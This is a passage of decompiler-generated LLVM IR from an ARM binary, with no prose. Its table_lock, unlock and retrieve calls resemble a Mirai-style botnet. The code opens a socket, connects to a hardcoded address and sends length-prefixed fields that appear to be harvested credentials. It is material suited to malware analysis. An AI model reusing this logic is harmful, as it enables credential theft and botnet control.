  %v0_fb64 = load i32, i32* @r6, align 4
  %v1_fb64 = add i32 %v0_fb64, 12
  %v2_fb64 = inttoptr i32 %v1_fb64 to i32*
  %v3_fb64 = load i32, i32* %v2_fb64, align 4
  store i32 %v3_fb64, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ef7c.backedge

dec_label_pc_fb6c:                                ; preds = %dec_label_pc_fa88
  %v0_fb6c = load i32, i32* @r6, align 4
  %v1_fb6c = add i32 %v0_fb6c, 4
  %v2_fb6c = inttoptr i32 %v1_fb6c to i32*
  %v3_fb6c = load i32, i32* %v2_fb6c, align 4
  store i32 %v3_fb6c, i32* %r0.global-to-local, align 4
  %v1_fb70 = call i32 @__GI___libc_close(i32 %v3_fb6c)
  store i32 %v1_fb70, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_fb78 = load i32, i32* @r4, align 4
  %v1_fb78 = load i32, i32* @r6, align 4
  %v2_fb78 = add i32 %v1_fb78, 12
  %v3_fb78 = inttoptr i32 %v2_fb78 to i32*
  store i32 %v0_fb78, i32* %v3_fb78, align 4
  %v0_fb7c = load i32, i32* %r3.global-to-local, align 4
  %v1_fb7c = load i32, i32* @r6, align 4
  %v2_fb7c = add i32 %v1_fb7c, 4
  %v3_fb7c = inttoptr i32 %v2_fb7c to i32*
  store i32 %v0_fb7c, i32* %v3_fb7c, align 4
  %v0_fb80 = load i32, i32* @r4, align 4
  %v1_fb80 = trunc i32 %v0_fb80 to i8
  %v2_fb80 = load i32, i32* @r6, align 4
  %v3_fb80 = add i32 %v2_fb80, 284
  %v4_fb80 = inttoptr i32 %v3_fb80 to i8*
  store i8 %v1_fb80, i8* %v4_fb80, align 1
  br label %dec_label_pc_f080

dec_label_pc_fb88:                                ; preds = %dec_label_pc_f030
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_fb8c = load i32, i32* @fp, align 4
  %v2_fb8c = inttoptr i32 %v1_fb8c to i32*
  store i32 104, i32* %v2_fb8c, align 4
  br label %dec_label_pc_f048

dec_label_pc_fb94:                                ; preds = %thread-pre-split124
  store i32 %v1_fb98, i32* %r0.global-to-local, align 4
  %v0_fb9c = load i32, i32* @r6, align 4
  %v1_fb9c = add i32 %v0_fb9c, 12
  %v2_fb9c = inttoptr i32 %v1_fb9c to i32*
  %v3_fb9c = load i32, i32* %v2_fb9c, align 4
  store i32 %v3_fb9c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ef7c.backedge

dec_label_pc_ef7c.backedge.thread:                ; preds = %dec_label_pc_f13c, %dec_label_pc_f210, %dec_label_pc_f3b4, %dec_label_pc_f488, %dec_label_pc_f5d4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ef84

dec_label_pc_ef7c.backedge.thread561:             ; preds = %dec_label_pc_f4ec, %dec_label_pc_f418, %dec_label_pc_f638, %dec_label_pc_f274, %dec_label_pc_f1a0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ef84

dec_label_pc_ef7c.backedge:                       ; preds = %dec_label_pc_eff8, %dec_label_pc_fb94, %dec_label_pc_fb54
  %v0_ef84228 = phi i32 [ %v0_fb64, %dec_label_pc_fb54 ], [ %v0_fb9c, %dec_label_pc_fb94 ], [ %v0_eff8, %dec_label_pc_eff8 ]
  %v0_ef7c.be = phi i32 [ %v3_fb64, %dec_label_pc_fb54 ], [ %v3_fb9c, %dec_label_pc_fb94 ], [ %v3_eff8, %dec_label_pc_eff8 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ef7c = icmp eq i32 %v0_ef7c.be, 0
  store i1 %v2_ef7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef7c, label %dec_label_pc_f080, label %dec_label_pc_ef84

dec_label_pc_fba4:                                ; preds = %bb459
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_fbb0 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_fbb0, i32* %r0.global-to-local, align 4
  %v2_fbb4 = icmp eq i32 %v3_fbb0, -1
  store i1 %v2_fbb4, i1* %cpsr_c.global-to-local, align 1
  %v7_fbb4 = icmp eq i32 %v3_fbb0, -1
  store i1 %v7_fbb4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_fbb0, i32* @r4, align 4
  br i1 %v7_fbb4, label %dec_label_pc_fc38, label %dec_label_pc_fbc0

dec_label_pc_fbc0:                                ; preds = %dec_label_pc_fba4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_fbc4 = call i32 @table_unlock_val(i32 4)
  store i32 %v2_f9e8, i32* @lr, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 2, i32* %stack_var_-96, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_1927c.91 to i32), i32* @r0, align 4
  %v2_fbd8 = call i32 @inet_addr(i32 ptrtoint ([15 x i8]* @global_var_1927c.91 to i32))
  %v0_fbdc = load i32, i32* @r5, align 4
  store i32 %v0_fbdc, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v2_fbe8 = inttoptr i32 %v0_fbdc to i32*
  %v3_fbe8 = call i32 @table_retrieve_val(i32 4, i32* %v2_fbe8)
  store i32 %v2_f9e8, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_fbfc = call i32 @table_lock_val(i32 4)
  %v0_fc04 = load i32, i32* @r4, align 4
  store i32 %v0_fc04, i32* %r0.global-to-local, align 4
  store i32 %v2_e8b8, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_fc10 = call i32 @__libc_connect(i32 %v0_fc04, i32 %v2_e8b8, i32 16)
  store i32 %v3_fc10, i32* %r0.global-to-local, align 4
  %v3_fc14 = icmp eq i32 %v3_fc10, -1
  store i1 %v3_fc14, i1* %cpsr_c.global-to-local, align 1
  %v8_fc14 = icmp eq i32 %v3_fc10, -1
  store i1 %v8_fc14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_fc14, label %dec_label_pc_fc1c, label %dec_label_pc_fc40

dec_label_pc_fc1c:                                ; preds = %dec_label_pc_fbc0
  %v0_fc1c = load i32, i32* @r4, align 4
  store i32 %v0_fc1c, i32* %r0.global-to-local, align 4
  %v1_fc20 = call i32 @__GI___libc_close(i32 %v0_fc1c)
  %v0_fc24 = load i32, i32* @r5, align 4
  store i32 %v0_fc24, i32* %r0.global-to-local, align 4
  %v1_fc28 = call i32 @__GI_exit(i32 %v0_fc24)
  store i32 %v1_fc28, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fc2c

dec_label_pc_fc2c:                                ; preds = %dec_label_pc_e688, %dec_label_pc_fc1c
  store i32 ptrtoint (i32* @global_var_2474c.153 to i32), i32* %ip.global-to-local, align 4
  %v2_fc30 = load i32, i32* @global_var_2474c.153, align 4
  store i32 %v2_fc30, i32* %r0.global-to-local, align 4
  %v1_fc34 = call i32 @__GI___libc_close(i32 %v2_fc30)
  store i32 %v1_fc34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fc38

dec_label_pc_fc38:                                ; preds = %dec_label_pc_e664.dec_label_pc_fc38_crit_edge, %dec_label_pc_fba4, %dec_label_pc_fc40, %dec_label_pc_fc2c
  %.pre.pre-phi = phi i32 [ %.pre283, %dec_label_pc_e664.dec_label_pc_fc38_crit_edge ], [ %v2_e6ac, %dec_label_pc_fba4 ], [ %v2_fc40.pre-phi, %dec_label_pc_fc40 ], [ %v2_e6ac, %dec_label_pc_fc2c ]
  %v0_fc38 = load i32, i32* @r5, align 4
  store i32 %v0_fc38, i32* %r0.global-to-local, align 4
  %v1_fc3c = call i32 @__GI_exit(i32 %v0_fc38)
  store i32 %v1_fc3c, i32* %r0.global-to-local, align 4
  %.pre281 = ptrtoint i32* %stack_var_-60 to i32
  br label %dec_label_pc_fc40

dec_label_pc_fc40:                                ; preds = %dec_label_pc_fbc0, %dec_label_pc_fc38
  %v2_fc60.pre-phi = phi i32 [ %v2_f82c, %dec_label_pc_fbc0 ], [ %.pre281, %dec_label_pc_fc38 ]
  %v2_fc40.pre-phi = phi i32 [ %v2_e6ac, %dec_label_pc_fbc0 ], [ %.pre.pre-phi, %dec_label_pc_fc38 ]
  store i32 %v2_fc40.pre-phi, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fc4c = load i32, i32* @r4, align 4
  store i32 %v0_fc4c, i32* %r0.global-to-local, align 4
  %v0_fc50 = load i32, i32* @r5, align 4
  %v6_fc50 = trunc i32 %v0_fc50 to i8
  store i8 %v6_fc50, i8* %stack_var_-56, align 1
  %v6_fc54 = call i32 @__libc_send(i32 %v0_fc4c, i32 %v2_fc40.pre-phi, i32 1, i32 16384)
  %v0_fc5c = load i32, i32* @r4, align 4
  store i32 %v0_fc5c, i32* %r0.global-to-local, align 4
  store i32 %v2_fc60.pre-phi, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fc6c = call i32 @__libc_send(i32 %v0_fc5c, i32 %v2_fc60.pre-phi, i32 4, i32 16384)
  %v0_fc74 = load i32, i32* @r4, align 4
  store i32 %v0_fc74, i32* %r0.global-to-local, align 4
  %v2_fc78 = ptrtoint i32* %stack_var_-42 to i32
  store i32 %v2_fc78, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fc84 = call i32 @__libc_send(i32 %v0_fc74, i32 %v2_fc78, i32 2, i32 16384)
  %v0_fc88 = load i32, i32* @r8, align 4
  %v1_fc88 = add i32 %v0_fc88, 12
  store i32 %v1_fc88, i32* %r1.global-to-local, align 4
  %v0_fc8c = load i32, i32* @r4, align 4
  store i32 %v0_fc8c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fc98 = call i32 @__libc_send(i32 %v0_fc8c, i32 %v1_fc88, i32 1, i32 16384)
  store i32 %v4_fc98, i32* %r0.global-to-local, align 4
  %v0_fc9c = load i32, i32* @r8, align 4
  %v1_fc9c = inttoptr i32 %v0_fc9c to i32*
  %v2_fc9c = load i32, i32* %v1_fc9c, align 4
  store i32 %v2_fc9c, i32* %r1.global-to-local, align 4
  %v1_fca0 = add i32 %v0_fc9c, 12
  %v2_fca0 = inttoptr i32 %v1_fca0 to i8*
  %v3_fca0 = load i8, i8* %v2_fca0, align 1
  %v4_fca0 = zext i8 %v3_fca0 to i32
  store i32 %v4_fca0, i32* %r2.global-to-local, align 4
  %v0_fca4 = load i32, i32* @r4, align 4
  store i32 %v0_fca4, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fcac = call i32 @__libc_send(i32 %v0_fca4, i32 %v2_fc9c, i32 %v4_fca0, i32 16384)
  %v0_fcb0 = load i32, i32* @r8, align 4
  %v1_fcb0 = add i32 %v0_fcb0, 13
  store i32 %v1_fcb0, i32* %r1.global-to-local, align 4
  %v0_fcb4 = load i32, i32* @r4, align 4
  store i32 %v0_fcb4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fcc0 = call i32 @__libc_send(i32 %v0_fcb4, i32 %v1_fcb0, i32 1, i32 16384)
  %v0_fcc4 = load i32, i32* @r4, align 4
  store i32 %v0_fcc4, i32* %r0.global-to-local, align 4
  %v0_fcc8 = load i32, i32* @r8, align 4
  %v1_fcc8 = add i32 %v0_fcc8, 13
  %v2_fcc8 = inttoptr i32 %v1_fcc8 to i8*
  %v3_fcc8 = load i8, i8* %v2_fcc8, align 1
  %v4_fcc8 = zext i8 %v3_fcc8 to i32
  store i32 %v4_fcc8, i32* %r2.global-to-local, align 4
  %v1_fccc = add i32 %v0_fcc8, 4
  %v2_fccc = inttoptr i32 %v1_fccc to i32*
  %v3_fccc = load i32, i32* %v2_fccc, align 4
  store i32 %v3_fccc, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fcd4 = call i32 @__libc_send(i32 %v0_fcc4, i32 %v3_fccc, i32 %v4_fcc8, i32 16384)
  %v0_fcd8 = load i32, i32* @r4, align 4
  store i32 %v0_fcd8, i32* %r0.global-to-local, align 4
  %v1_fcdc = call i32 @__GI___libc_close(i32 %v0_fcd8)
  store i32 %v1_fcdc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fc38

; uselistorder directives
  uselistorder i32 %v2_fc40.pre-phi, { 2, 1, 0 }
  uselistorder i32 %v2_fc60.pre-phi, { 1, 0 }
  uselistorder i1 %v7_fbb4, { 1, 0 }
  uselistorder i32 %v3_fbb0, { 1, 0, 2, 3 }
  uselistorder i32 %v3_fb34, { 1, 0 }
  uselistorder i1 %v3_fb24, { 1, 0 }
  uselistorder i32 %v0_fb08, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v3_fad4, { 2, 1, 0, 3 }
  uselistorder i32 %v3_fad0, { 1, 0 }
  uselistorder i32 %v0_fac8, { 1, 0 }
  uselistorder i32 %v3_fa48, { 1, 0 }
  uselistorder i1 %v2_fa14, { 1, 0 }
  uselistorder i32 %.465, { 1, 0 }
  uselistorder i1 %v7_f9fc, { 1, 0 }
  uselistorder i32 %v0_f9f8, { 2, 1, 0, 3 }
  uselistorder i1 %v7_f9d0, { 1, 0 }
  uselistorder i32 %v0_f9d0, { 2, 1, 0, 3 }
  uselistorder i32 %v0_f920.pr, { 1, 0 }
  uselistorder i32 %v0_f8ec, { 1, 2, 0 }
  uselistorder i32 %v4_f88c, { 1, 0, 2 }
  uselistorder i1 %v7_f868, { 1, 0 }
  uselistorder i32 %v1_f810, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f810, { 0, 2, 1 }
  uselistorder i32 %v0_f808, { 1, 0 }
  uselistorder i1 %v7_f804, { 1, 0 }
  uselistorder i1 %v7_f7fc, { 1, 0 }
  uselistorder i1 %v7_f7f4, { 1, 0 }
  uselistorder i1 %v8_f7ec, { 1, 0 }
  uselistorder i1 %v7_f7d0, { 1, 0 }
  uselistorder i1 %v7_f7c8, { 1, 0 }
  uselistorder i1 %v7_f7c0, { 1, 0 }
  uselistorder i1 %v8_f7b8, { 1, 0 }
  uselistorder i32 %v1_f7a0, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v0_f74c, { 1, 0 }
  uselistorder i32 %v4_f740, { 1, 0, 2 }
  uselistorder i32 %v1_f70c, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_f70c, { 0, 2, 1 }
  uselistorder i32 %v0_f704, { 1, 0 }
  uselistorder i1 %v7_f700, { 1, 0 }
  uselistorder i1 %v7_f6f8, { 1, 0 }
  uselistorder i1 %v8_f6f0, { 1, 0 }
  uselistorder i1 %v7_f6d4, { 1, 0 }
  uselistorder i1 %v7_f6cc, { 1, 0 }
  uselistorder i1 %v8_f6c4, { 1, 0 }
  uselistorder i32 %v1_f6ac, { 1, 2, 3, 4, 5, 0, 6, 7, 8 }
  uselistorder i1 %v8_f648, { 1, 0 }
  uselistorder i8 %v3_f640, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f638, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f638, { 0, 2, 1 }
  uselistorder i32 %v0_f630, { 1, 0 }
  uselistorder i1 %v7_f62c, { 1, 0 }
  uselistorder i1 %v7_f624, { 1, 0 }
  uselistorder i1 %v7_f61c, { 1, 0 }
  uselistorder i1 %v7_f608, { 1, 0 }
  uselistorder i1 %v7_f600, { 1, 0 }
  uselistorder i1 %v7_f5f8, { 1, 0 }
  uselistorder i1 %v8_f5f0, { 1, 0 }
  uselistorder i32 %v1_f5d8, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_f4fc, { 1, 0 }
  uselistorder i8 %v3_f4f4, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f4ec, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f4ec, { 0, 2, 1 }
  uselistorder i32 %v0_f4e4, { 1, 0 }
  uselistorder i1 %v7_f4e0, { 1, 0 }
  uselistorder i1 %v7_f4d8, { 1, 0 }
  uselistorder i1 %v7_f4d0, { 1, 0 }
  uselistorder i1 %v7_f4bc, { 1, 0 }
  uselistorder i1 %v7_f4b4, { 1, 0 }
  uselistorder i1 %v7_f4ac, { 1, 0 }
  uselistorder i1 %v8_f4a4, { 1, 0 }
  uselistorder i32 %v1_f48c, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_f428, { 1, 0 }
  uselistorder i8 %v3_f420, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f418, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f418, { 0, 2, 1 }
  uselistorder i32 %v0_f410, { 1, 0 }
  uselistorder i1 %v7_f40c, { 1, 0 }
  uselistorder i1 %v7_f404, { 1, 0 }
  uselistorder i1 %v7_f3fc, { 1, 0 }
  uselistorder i1 %v7_f3e8, { 1, 0 }
  uselistorder i1 %v7_f3e0, { 1, 0 }
  uselistorder i1 %v7_f3d8, { 1, 0 }
  uselistorder i1 %v8_f3d0, { 1, 0 }
  uselistorder i32 %v1_f3b8, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v0_f3a4, { 1, 0 }
  uselistorder i32 %v1_f39c, { 1, 0 }
  uselistorder i32 %v1_f394, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v3_f390, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_f390, { 0, 2, 1 }
  uselistorder i32 %v0_f370.pr, { 1, 0 }
  uselistorder i32 %v0_f350.pr, { 1, 0 }
  uselistorder i1 %v7_f328, { 1, 0 }
  uselistorder i1 %v2_f318, { 1, 0, 2 }
  uselistorder i1 %v2_f2fc, { 1, 0, 2 }
  uselistorder i32 %v1_f31c, { 1, 2, 3, 0 }
  uselistorder i32 %v1_f2f0, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v2_f320, { 0, 1, 4, 2, 3, 5 }
  uselistorder i1 %v8_f284, { 1, 0 }
  uselistorder i8 %v3_f27c, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f274, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f274, { 0, 2, 1 }
  uselistorder i32 %v0_f26c, { 1, 0 }
  uselistorder i1 %v7_f268, { 1, 0 }
  uselistorder i1 %v7_f260, { 1, 0 }
  uselistorder i1 %v7_f258, { 1, 0 }
  uselistorder i1 %v7_f244, { 1, 0 }
  uselistorder i1 %v7_f23c, { 1, 0 }
  uselistorder i1 %v7_f234, { 1, 0 }
  uselistorder i1 %v8_f22c, { 1, 0 }
  uselistorder i32 %v1_f214, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_f1b0, { 1, 0 }
  uselistorder i8 %v3_f1a8, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f1a0, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f1a0, { 0, 2, 1 }
  uselistorder i32 %v0_f198, { 1, 0 }
  uselistorder i1 %v7_f194, { 1, 0 }
  uselistorder i1 %v7_f18c, { 1, 0 }
  uselistorder i1 %v7_f184, { 1, 0 }
  uselistorder i1 %v7_f170, { 1, 0 }
  uselistorder i1 %v7_f168, { 1, 0 }
  uselistorder i1 %v7_f160, { 1, 0 }
  uselistorder i1 %v8_f158, { 1, 0 }
  uselistorder i32 %v1_f140, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v0_f12c, { 1, 2, 0 }
  uselistorder i32 %v2_f118, { 1, 0 }
  uselistorder i32 %v0_f118, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v3_f114, { 2, 1, 4, 0, 5, 3 }
  uselistorder i32 %v1_f0ec, { 2, 1, 0 }
  uselistorder i1 %v7_f0c8, { 1, 0 }
  uselistorder i32 %v4_f0c4, { 1, 0, 2 }
  uselistorder i32 %v1_f084, { 2, 0, 3, 4, 5, 1 }
  uselistorder i1 %v1_f068, { 1, 0 }
  uselistorder i32 %v1_f058, { 2, 1, 0 }
  uselistorder i32 %v1_f054, { 1, 0 }
  uselistorder i32 %v0_eff8, { 2, 5, 6, 20, 7, 8, 21, 9, 10, 24, 11, 12, 22, 13, 14, 23, 4, 3, 19, 15, 16, 25, 17, 18, 26, 27, 1, 0 }
  uselistorder i32 %v1_efd4, { 1, 2, 3, 0 }
  uselistorder i32 %v3_efd0, { 1, 0 }
  uselistorder i32 %v4_efb4, { 0, 4, 1, 2, 3, 5, 6, 7 }
  uselistorder i32 %v2_efa0, { 1, 0, 2 }
  uselistorder i32 %v3_ef9c, { 1, 0, 2 }
  uselistorder i32 %v0_fa58, { 1, 0, 2 }
  uselistorder i32 %v3_ef68, { 1, 0 }
  uselistorder i32 %v1_ef50, { 3, 2, 1, 0 }
  uselistorder i32 %v3_ef4c, { 1, 0 }
  uselistorder i32 %v3_ef44, { 1, 2, 0 }
  uselistorder i1 %v7_ef34, { 1, 0 }
  uselistorder i32 %v3_ef30, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v0_ef24, { 1, 0 }
  uselistorder i32 %v1_eecc, { 0, 1, 3, 2 }
  uselistorder i32 %v0_eecc, { 0, 1, 3, 2 }
  uselistorder i32 %v0_eeb0, { 0, 2, 1 }
  uselistorder i32 %v1_eea8, { 1, 0 }
  uselistorder i32 %v1_ee68, { 2, 1, 0 }
  uselistorder i32 %v1_ee64, { 1, 0 }
  uselistorder i1 %v2_ee44, { 1, 0, 2 }
  uselistorder i32 %v0_ee40, { 1, 0, 2 }
  uselistorder i1 %v7_ee0c, { 0, 3, 4, 1, 2 }
  uselistorder i1 %v2_ee0c, { 1, 0, 2 }
  uselistorder i32 %v2_ee04, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_edf8, { 1, 0, 2 }
  uselistorder i32 %v0_edfc, { 1, 0 }
  uselistorder i32 %v1_ede0, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v1_edd4, { 0, 1, 3, 2 }
  uselistorder i32 %v0_edd4, { 0, 2, 1 }
  uselistorder i32 %v1_edc4, { 1, 0 }
  uselistorder i32 %v3_ee90, { 4, 7, 5, 6, 1, 0, 9, 3, 2, 8 }
  uselistorder i32 %v1_ed24, { 1, 0 }
  uselistorder i32 %v1_ed0c, { 0, 2, 3, 1 }
  uselistorder i32 %v0_ed18, { 0, 3, 2, 1 }
  uselistorder i32 %v0_ecc8, { 2, 3, 4, 1, 0, 5, 7, 6 }
  uselistorder i32 %v5_ecbc, { 2, 1, 0 }
  uselistorder i32 %v1_ec9c, { 2, 0, 1, 3, 4 }
  uselistorder i1 %v2_ec78, { 1, 0 }
  uselistorder i1 %v9_ec44, { 1, 0 }
  uselistorder i32 %v0_ebf4, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_eb98, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_eb48, { 1, 0 }
  uselistorder i32 %v5_eae0, { 1, 0 }
  uselistorder i32 %v3_ead0, { 1, 2, 0 }
  uselistorder i16 %v4_eacc, { 1, 0 }
  uselistorder i32 %v3_eacc, { 1, 0 }
  uselistorder i1 %v2_ea08, { 1, 0 }
  uselistorder i1 %v2_e9f4, { 1, 0 }
  uselistorder i1 %v2_e9e0, { 1, 0 }
  uselistorder i32 %.464, { 2, 1, 0 }
  uselistorder i1 %v7_e9bc, { 2, 1, 0, 5, 4, 3 }
  uselistorder i1 %v2_e9a4, { 1, 0 }
  uselistorder i1 %v3_e988, { 1, 0, 2 }
  uselistorder i1 %v2_e974, { 1, 0 }
  uselistorder i1 %v2_e950, { 1, 0 }
  uselistorder i32 %v1_e900, { 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 31, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_e8ec, { 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 30, 31, 32, 29, 28, 27, 26, 25, 24, 23, 22, 20, 21, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 6, 7, 8, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_e8e8, { 4, 5, 6, 7, 0, 8, 1, 2, 3, 9 }
  uselistorder i32 %v0_e8d0, { 1, 0 }
  uselistorder i32 %stack_var_-1876.0, { 0, 3, 2, 1 }
  uselistorder i32 %v2_e8b8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_f9e8, { 1, 2, 3, 0 }
  uselistorder i32 %v2_f82c, { 0, 2, 1, 4, 11, 12, 10, 7, 9, 8, 6, 5, 3 }
  uselistorder i32 %v2_f8d4, { 1, 2, 0 }
  uselistorder i32 %v2_ee9c, { 0, 5, 1, 4, 2, 7, 3, 6 }
  uselistorder i32 %v2_e890, { 0, 2, 4, 7, 6, 8, 1, 3, 5, 9, 10 }
  uselistorder i32 %v4_e760, { 2, 1, 0, 3 }
  uselistorder i16 %v5_e6f4.le, { 1, 0 }
  uselistorder i32 %v0_e6d8, { 3, 2, 0, 1 }
  uselistorder i32 %v2_e6ac, { 2, 0, 1, 3, 4 }
  uselistorder i1 %v7_e678, { 1, 0 }
  uselistorder i32 %v3_e670, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %v0_e65c, { 1, 0 }
  uselistorder i32 %v2_e640, { 1, 0, 2 }
  uselistorder i32 %v0_e62c, { 1, 2, 0 }
  uselistorder i32 %storemerge329, { 1, 0 }
  uselistorder i32 %v0_e5a0, { 3, 2, 1, 0, 4 }
  uselistorder i8* %stack_var_-56, { 4, 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-52, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12 }
  uselistorder i32* %stack_var_-60, { 0, 11, 12, 13, 9, 14, 15, 1, 2, 16, 3, 17, 6, 18, 4, 19, 5, 20, 7, 21, 8, 22, 10, 23 }
  uselistorder i32* %stack_var_-42, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 79, 78, 80, 81, 83, 82, 84, 85, 35, 93, 62, 63, 0, 1, 2, 36, 37, 38, 39, 40, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 41, 42, 43, 44, 45, 46, 47, 48, 49, 51, 50, 52, 53, 54, 55, 57, 56, 58, 59, 60, 61, 64, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 137, 138, 140, 139, 136, 141, 164, 165, 142, 143, 163, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 112, 161, 162, 86, 87, 88, 89, 90, 91, 92, 94, 96, 95, 98, 97, 106, 99, 100, 101, 102, 103, 104, 105, 107, 108, 109, 110, 111 }
  uselistorder i32* %r2.global-to-local, { 43, 44, 45, 46, 47, 48, 49, 35, 36, 37, 50, 51, 52, 53, 23, 38, 39, 0, 1, 24, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 40, 41, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 95, 80, 81, 97, 98, 100, 99, 96, 115, 101, 116, 103, 102, 42, 104, 105, 106, 107, 108, 109, 110, 111, 112, 94, 113, 114, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79 }
  uselistorder i32* %r1.global-to-local, { 51, 52, 53, 54, 55, 56, 57, 43, 45, 44, 46, 58, 59, 60, 29, 47, 48, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 35, 31, 32, 33, 34, 36, 37, 38, 39, 40, 41, 42, 88, 89, 49, 50, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87 }
